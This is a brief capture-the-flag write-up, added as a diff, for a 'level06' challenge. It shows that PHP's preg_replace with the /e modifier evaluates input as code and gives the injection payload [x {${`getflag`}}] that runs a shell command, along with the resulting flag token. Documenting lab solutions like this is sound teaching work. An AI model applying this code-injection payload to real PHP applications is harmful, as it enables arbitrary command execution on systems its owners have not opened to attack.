@@ -1,0 +1,13 @@
+
+- After logging we find level06 and level06.php in our home folder
+
+- When looking at level06.php the method preg_replace is called with the pattern /(\[x (.*)\])/e
+the /e modifer allows to use PHP code within your regex, it will be evaluated as part of the program
+
+- $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a is the content of argv[1]
+
+- We'll create a /tmp/file1 and type [x {${`getflag`}}] in it
+
+- After executing ./level06 /tmp/file1
+-> PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+
